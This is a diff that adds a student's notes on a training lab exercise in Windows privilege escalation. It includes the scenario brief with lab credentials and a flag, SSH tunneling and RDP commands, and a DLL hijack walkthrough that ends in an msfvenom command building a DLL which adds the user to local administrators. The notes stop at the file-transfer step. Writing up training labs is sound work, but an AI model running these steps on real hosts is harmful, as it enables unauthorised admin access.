@@ -1,0 +1,85 @@
+Donovian Windows Privilege Escalation (DWP)
+XX Jan 2027
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.
+
+Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty
+
+Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.
+
+Scheme of Maneuver:
+>internet_grey_host
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+
+Target Section:
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+#Create Tunnel to the pivot
+
+
+student@lin-ops:~$ ssh student@10.50.36.37 -L 2000:192.168.28.105:2222 -NT
+
+student@lin-ops:~$ ssh comrade@0.0.0.0 -p 2000 -L 3100:192.168.28.5:3389 -NT
+
+student@lin-ops:~$ xfreerdp /u:comrade /port:3100 /v:0.0.0.0 /dynamic-resolution +glyph-cache +clipboard
+
+Priv - Vuln 1
+
+Analyze the System and identify the means to escalate your privileges. Report the "status" of your finding by entering the correct Display Name.
+
+	Go to services, find one with a missing or odd display name
+
+What is the name of the DLL that is supposed to be loaded, by the vulnerable service?
+
+	sc.exe qc MemoryStatus
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: MemoryStatus
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\MemoryStatus\service.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : MemoryStatus
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+        
+ * Navigate to C:\MemoryStatus\service.exe
+ 	* Look in the c file for a dll
+ 	"hijackmeplz.dll"
+ 	
+ 	Now use msvenom to create a dll that gives you admin privs
+ 	
+ 	 msfvenom -p windows/exec CMD='net localgroup administrators comrade /add' -f dll > hijackmeplz.dll
+ 	
+ 	Now 
+ 	scp on the windows (pull from the linux)
+ 	
+ 	scp <lin_ip> filename location_on_windows	
